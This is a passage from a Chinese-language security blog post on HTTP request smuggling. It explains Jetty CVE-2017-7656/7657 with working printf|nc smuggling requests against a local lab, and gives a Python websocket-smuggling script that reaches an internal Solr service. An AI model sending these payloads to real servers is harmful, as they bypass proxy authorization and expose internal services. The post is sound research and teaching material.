BGCOLOR=&quot;white&quot; FGCOLOR=&quot;black&quot;&gt;</span><br><span class="line">&lt;H1&gt;Bad Request&lt;/H1&gt;</span><br><span class="line">&lt;HR&gt;</span><br><span class="line"></span><br><span class="line">&lt;FONT FACE=&quot;Helvetica,Arial&quot;&gt;&lt;B&gt;</span><br><span class="line"><span class="hljs-attribute">Description</span>: Could not process this request.</span><br><span class="line">&lt;/B&gt;&lt;/FONT&gt;</span><br><span class="line">&lt;HR&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br></pre></td></tr></table></figure><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Server</span>: ATS/7.1.1</span><br><span class="line"><span class="hljs-attribute">Date</span>: Fri, 29 Nov 2019 18:52:42 GMT</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 119</span><br><span class="line"><span class="hljs-attribute">Last-Modified</span>: Fri, 29 Nov 2019 05:37:09 GMT</span><br><span class="line"><span class="hljs-attribute">ETag</span>: &quot;5de0ae85-77&quot;</span><br><span class="line"><span class="hljs-attribute">X-Location-echo</span>: /index.html?replaced=0&amp;cache=8</span><br><span class="line"><span class="hljs-attribute">X-Default-VH</span>: 0</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: public, max-age=300</span><br><span class="line"><span class="hljs-attribute">Accept-Ranges</span>: bytes</span><br><span class="line"><span class="hljs-attribute">Age</span>: 0</span><br><span class="line"><span class="hljs-attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Nginx default static page&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;h1&gt;Hello World&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;It works!&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h2><p>Jetty &#x6709;&#x4E09;&#x4E2A;&#x4E0E; HTTP Smuggling &#x76F8;&#x5173;&#x7684; CVE&#xFF1A;</p><ul><li><p>CVE-2017-7656 HTTP/0.9 issue</p><blockquote><p>&#x200B;    In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space URI space version) that declares a version of HTTP/0.9 was accepted and treated as a 0.9 request. If deployed behind an intermediary that also accepted and passed through the 0.9 version (but did not act on it), then the response sent could be interpreted by the intermediary as HTTP/1 headers. This could be used to poison the cache if the server allowed the origin client to generate arbitrary content in the response.</p></blockquote></li><li><p>CVE-2017-7657  Chunk size attribute truncation</p><blockquote><p>&#x200B;    In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request.</p></blockquote></li><li><p>CVE-2017-7658 Double Content-Length</p><blockquote><p>&#x200B;    In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined request would bypass that authorization.</p></blockquote></li></ul><p>&#x5BF9;&#x4E8E; CVE-2017-7658 &#x6211;&#x4EEC;&#x5C31;&#x4E0D;&#x518D;&#x63A2;&#x7A76;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x4E4B;&#x524D;&#x4E5F;&#x63D0;&#x8FC7;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x6765;&#x770B;&#x53E6;&#x5916;&#x4E24;&#x4E2A;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x5730;&#x65B9;&#x3002;</p><h3 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h3><p>&#x73AF;&#x5883;&#x4F9D;&#x65E7;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6211;&#x6784;&#x5EFA;&#x7684; <a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/jetty" target="_blank" rel="noopener">jetty lab &#x73AF;&#x5883;</a>&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x7528;&#x5982;&#x4E0B;&#x65B9;&#x5F0F;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x6807;&#x51C6;&#x7684; HTTP/0.9 &#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET /?test=4564\r\n&apos;</span>|nc -q 1 127.0.0.1 8994</span><br></pre></td></tr></table></figure><p>&#x5F97;&#x5230;&#x4E00;&#x4E2A; 400 &#x54CD;&#x5E94;&#xFF1A;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">400</span> HTTP/0.9 not supported</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html;charset=iso-8859-1</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 65</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Server</span>: Jetty(9.4.9.v20180320)</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: HTTP/0.9 not supported&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x52A0;&#x4E0A;&#x7248;&#x672C;&#x6807;&#x8BC6;&#xFF1A;</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET /?test=4564 HTTP/0.9\r\n\r\n&apos;</span>|nc -q 1 127.0.0.1 8994</span><br></pre></td></tr></table></figure><p>&#x867D;&#x7136;&#x8FD9;&#x662F; HTTP/0.9 &#x4E0D;&#x652F;&#x6301;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x4F1A;&#x6709;&#x610F;&#x5916;&#x7684;&#x6536;&#x83B7;&#xFF0C;&#x5F97;&#x5230;&#x4E00;&#x4E2A; 200 &#x54CD;&#x5E94;&#xFF1A;</p><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Sample &quot;Hello, World&quot; Application<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">white</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x7684;&#x54CD;&#x5E94;&#x6CA1;&#x6709; headers &#xFF0C;&#x53EA;&#x6709; body &#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x88AB; HTTP/0.9 &#x8FDB;&#x884C;&#x4E86;&#x89E3;&#x6790;&#x3002;</p><p>&#x800C;&#x4E14;&#x66F4;&#x6709;&#x610F;&#x601D;&#x7684;&#x662F;&#xFF0C;&#x6DFB;&#x52A0;&#x4E0A; HTTP/0.9 &#x4E0D;&#x652F;&#x6301;&#x7684; headers &#x4E5F;&#x4F1A;&#x6709;&#x610F;&#x5916;&#x7684;&#x6536;&#x83B7;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x63D0;&#x53D6;&#x54CD;&#x5E94;&#x5305;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#x7684; header&#xFF1A;</p><figure class="highlight tex hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf &apos;GET /?test=4564 HTTP/0.9<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>&apos;<span class="hljs-tag">\</span></span><br><span class="line">&apos;Range: bytes=36-42<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>&apos;<span class="hljs-tag">\</span></span><br><span class="line">&apos;<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>&apos;<span class="hljs-tag">\</span></span><br><span class="line">|nc -q 1 127.0.0.1 8994</span><br><span class="line"></span><br><span class="line">, World</span><br></pre></td></tr></table></figure><p>&#x4F1A;&#x53D1;&#x73B0; body &#x5185;&#x5BB9;&#x88AB;&#x6211;&#x4EEC;&#x8FDB;&#x884C;&#x4E86;&#x63D0;&#x53D6;&#xFF0C;&#x7ED3;&#x5408;&#x6211;&#x4EEC;&#x4E0A;&#x6587;&#x63D0;&#x5230;&#x7684;&#x7ED3;&#x5408; HTTP Version &#x8FDB;&#x884C;&#x7684; HTTP Response Splitting &#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5404;&#x79CD;&#x82B1;&#x5F0F;&#x653B;&#x51FB;</p><h3 id="Chunk-size-attribute-truncation"><a href="#Chunk-size-attribute-truncation" class="headerlink" title="Chunk size attribute truncation"></a>Chunk size attribute truncation</h3><p>&#x6211;&#x4EEC;&#x5229;&#x7528;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;POST /?test=4973 HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-Type: application/x-www-form-urlencoded\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host: localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;100000000\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;POST /?test=4974 HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-Length: 5\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host: localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8994|grep <span class="hljs-string">&quot;HTTP/1.1&quot;</span></span><br></pre></td></tr></table></figure><p>&#x7136;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E24;&#x4E2A; 200 &#x54CD;&#x5E94;&#x53EF;&#x662F;&#x6309;&#x7167; chunk &#x7684;&#x6807;&#x51C6;&#xFF0C;&#x867D;&#x7136;&#x7B2C;&#x4E8C;&#x4E2A;&#x90E8;&#x5206;&#x770B;&#x8D77;&#x6765;&#x662F;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x4F46;&#x662F;&#x5B9E;&#x9645;&#x4E0A;&#x5E94;&#x8BE5;&#x88AB;&#x7B97;&#x5728; chunk data &#x5F53;&#x4E2D;&#xFF0C;&#x800C;&#x95EE;&#x9898;&#x5C31;&#x5728;&#x8FD9;&#xFF0C;jetty &#x8FD4;&#x56DE;&#x4E86;&#x4E24;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x628A; 100000000 &#x5F53;&#x4F5C;&#x4E86; 0 &#xFF0C;&#x4E5F;&#x5C31;&#x662F; chunk end &#x90E8;&#x5206;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x51FA;&#x73B0;&#x4E86;&#x4E24;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x539F;&#x56E0;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x518D;&#x8FDB;&#x884C;&#x4E00;&#x4E9B;&#x5C1D;&#x8BD5;&#xFF1A;</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;POST /?test=4975 HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-Type: application/x-www-form-urlencoded\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host: localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;1ff00000008\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;abcdefgh\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;POST /?test=4976 HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-Length: 5\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host: localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8994|grep <span class="hljs-string">&quot;HTTP/1.1&quot;</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4F9D;&#x7136;&#x5F97;&#x5230;&#x4E86;&#x4E24;&#x4E2A; 200 &#x54CD;&#x5E94;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7B2C;&#x4E00;&#x4E2A; chunk size 1ff00000008 &#x88AB; jetty &#x622A;&#x65AD;&#x6210;&#x4E86; 8 &#xFF0C;&#x4E5F;&#x5C31;&#x662F; chunk data &#x90E8;&#x5206;&#x53EA;&#x6709;<code>abcdefgh</code>&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x8FD4;&#x56DE;&#x4E86;&#x4E24;&#x4E2A;&#x54CD;&#x5E94;&#x3002;</p><p>&#x4E0E; Apache CVE-2015-3183 &#x7C7B;&#x4F3C;&#xFF0C;jetty &#x53EA;&#x4F1A;&#x53D6; chunk size &#x7684;&#x6700;&#x540E;8&#x4E2A;&#x5B57;&#x8282;&#xFF1A;</p><figure class="highlight lsl hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffffffffffff00000000\r\n</span><br><span class="line">            ^^^^^^^^</span><br><span class="line">            <span class="hljs-number">00000000</span> =&gt; size <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span>ff00000008\r\n</span><br><span class="line">   ^^^^^^^^</span><br><span class="line">   <span class="hljs-number">00000008</span> =&gt; size <span class="hljs-number">8</span></span><br></pre></td></tr></table></figure><h2 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h2><p>&#x5176;&#x5B9E;&#x8FD9;&#x90E8;&#x5206;&#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;&#x90E8;&#x5206;&#xFF0C;&#x4F46;&#x662F;&#x611F;&#x89C9;&#x7BC7;&#x5E45;&#x6709;&#x70B9;&#x957F;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x505A;&#x4E00;&#x4E0B;&#x7B80;&#x5355;&#x7684;&#x4ECB;&#x7ECD;&#xFF0C;&#x5728; Hackactivity 2019 &#x4E0A;&#xFF0C;@0ang3el &#x63D0;&#x51FA;&#x4E86;&#x4E0E; Websocket &#x76F8;&#x5173;&#x7684;&#x653B;&#x51FB;&#x6280;&#x672F; <a href="https://www.slideshare.net/0ang3el/whats-wrong-with-websocket-apis-unveiling-vulnerabilities-in-websocket-apis" target="_blank" rel="noopener">What&#x2019;s wrong with WebSocket APIs? Unveiling vulnerabilities in WebSocket APIs.</a>&#xFF0C;&#x8BA9;&#x6211;&#x6BD4;&#x8F83;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x5219;&#x662F; Websocket Smuggling &#x7684;&#x90E8;&#x5206;&#x3002;</p><p>&#x4F5C;&#x8005;&#x4E5F;&#x628A;&#x76F8;&#x5173;&#x7684;&#x63CF;&#x8FF0;&#x653E;&#x5728;&#x4E86; <a href="https://github.com/0ang3el/websocket-smuggle" target="_blank" rel="noopener">websocket-smuggle</a> &#x8FD9;&#x91CC;&#xFF0C;&#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#x9762;&#x662F;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;&#x5E2E;&#x5927;&#x5BB6;&#x4E00;&#x53E5;&#x8BDD;&#x603B;&#x7ED3;&#x5C31;&#x662F;&#x5728; websocket &#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x6CA1;&#x6709;&#x5B8C;&#x5168;&#x4E25;&#x683C;&#x9075;&#x5B88; RFC 6445 &#x6807;&#x51C6;&#xFF0C;&#x5728;&#x5904;&#x7406;<code>Sec-WebSocket-Version</code> &#x7248;&#x672C;&#x9519;&#x8BEF;&#x7684;&#x60C5;&#x51B5;&#x5E76;&#x6CA1;&#x6709;&#x505A;&#x597D;&#x76F8;&#x5E94;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5BFC;&#x81F4;&#x4E86;&#x4FDD;&#x6301;&#x4E86;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668; TCP/TLS &#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x6240;&#x4EE5;&#x9020;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FDB;&#x884C; Smuggling &#x8BF7;&#x6C42;&#x7684;&#x653B;&#x51FB;&#xFF0C;&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x8868;&#x73B0;&#x4E3A;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x8BBF;&#x95EE;&#x5185;&#x7F51;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x5047;&#x8BBE;&#x5185;&#x7F51;&#x5B58;&#x5728; solr &#x670D;&#x52A1;&#xFF0C;&#x5916;&#x7F51;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE;&#xFF0C;&#x5982;&#x679C;&#x5B58;&#x5728; websocket smuggling &#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7F16;&#x5199;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x8BBF;&#x95EE; solr &#x670D;&#x52A1;&#xFF1A;</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> socket </span><br><span class="line"></span><br><span class="line">req1 = <span class="hljs-string">&quot;&quot;&quot;GET /socket.io/?EIO=3&amp;transport=websocket HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: ip:port</span></span><br><span class="line"><span class="hljs-string">Sec-WebSocket-Version: 1338</span></span><br><span class="line"><span class="hljs-string">Upgrade: websocket</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&apos;\n&apos;</span>, <span class="hljs-string">&apos;\r\n&apos;</span>)</span><br><span class="line"></span><br><span class="line">req2 = <span class="hljs-string">&quot;&quot;&quot;GET /solr/#/ HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: localhost:8983</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&apos;\n&apos;</span>, <span class="hljs-string">&apos;\r\n&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(netloc)</span>:</span></span><br><span class="line">    host, port = netloc.split(<span class="hljs-string">&apos;:&apos;</span>)</span><br><span class="line"></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, int(port)))</span><br><span class="line"></span><br><span class="line">    sock.sendall(req1)</span><br><span class="line">    sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line"></span><br><span class="line">    sock.sendall(req2)</span><br><span class="line">    <span class="hljs-comment"># print req2</span></span><br><span class="line">    data = sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line">    data = data.decode(errors = <span class="hljs-string">&apos;ignore&apos;</span>)</span><br><span class="line">    print(data)</span><br><span class="line">    data = sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line">    data = data.decode(errors = <span class="hljs-string">&apos;ignore&apos;</span>)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    sock.shutdown(socket.SHUT_RDWR)</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(<span class="hljs-string">&apos;ip:port&apos;</span>)</span><br></pre></td></tr></table></figure><p>&#x5728;&#x4ECA;&#x5E74;&#x7EA2;&#x5E3D;&#x676F;&#x4E0A;&#x4E5F;&#x6709;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#x6280;&#x672F;&#x7684;&#x4E00;&#x9053; CTF &#x8D5B;&#x9898;&#xFF0C;&#x76F8;&#x5173;&#x7684; writeup &#x53EF;&#x4EE5;&#x770B;&#x770B; <a href="https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/#bank-service">Red Hat 2019 Web Write Up</a></p><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><p>&#x8FD9;&#x4E2A;&#x662F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x4E00;&#x4E2A;&#x90E8;&#x5206;&#xFF0C;&#x5F53;&#x65F6;&#x662F;&#x5728;10&#x6708;&#x521D; fuzz &#x7684;&#xFF0C;&#x7136;&#x540E;&#x4E5F;&#x627E;&#x4E86;&#x633A;&#x4E45;&#x7684;&#x76EE;&#x6807;&#xFF0C;&#x6700;&#x540E;&#x505C;&#x7559;&#x5728;&#x4E86;&#x4E4B;&#x524D;&#x540C;&#x5B66;&#x63A8;&#x8350;&#x7684;&#x4E00;&#x4E2A;&#x4E2D;&#x95F4;&#x4EF6; <a href="https://caddyserver.com/v1/" target="_blank" rel="noopener">caddy</a> &#x4E0A;&#xFF08;&#x73B0;&#x5728;&#x662F; 11&#x6708; 27 &#x65E5;&#xFF0C;&#x7ADF;&#x7136;&#x51FA; caddy 2 &#x4E86;&#x2026;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x62FF;&#x4ED6;&#x8FDB;&#x884C;&#x4E86;&#x5B9E;&#x9A8C;&#xFF0C;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x6BD4;&#x8F83;&#x61D2;&#x7528;&#x4E86; docker hub &#x4E0A;&#x7684;&#x73AF;&#x5883; <a href="https://hub.docker.com/r/abiosoft/caddy" target="_blank" rel="noopener">caddy</a>&#x3002;</p><p>&#x4E8E;&#x662F;&#x5C31;&#x6709;&#x4E86;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129022617.png" alt></p><p>&#x5F53;&#x65F6;&#x627E;&#x5230;&#x633A;&#x5F00;&#x5FC3;&#x7684;&#xFF0C;&#x4EE5;&#x4E3A;&#x4E00;&#x4E2A; CVE &#x5C31;&#x8FD9;&#x4E48;&#x7B80;&#x5355;&#x7684;&#x5230;&#x624B;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A; Netty CVE &#x7ED9;&#x7684;&#x542F;&#x793A;&#x561B;&#xFF0C;&#x8FD9;&#x4E5F;&#x7B97;&#x662F;&#x4E00;&#x4E2A;&#x89E3;&#x6790;&#x5DEE;&#x5F02;&#x3002;&#x7136;&#x540E;&#x5F53;&#x65F6;&#x6211;&#x8DDF;&#x5BFC;&#x5E08;&#x8FD8;&#x4ED4;&#x7EC6;&#x6DF1;&#x5165;&#x63A2;&#x7A76;&#x4E86;&#x8FD9;&#x4E2A;&#x4EA7;&#x751F;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x8DDF;&#x4E86;&#x4E00;&#x4E0B;&#x4EE3;&#x7801;&#xFF0C;&#x53D1;&#x73B0;&#x53EF;&#x80FD;&#x662F; Go 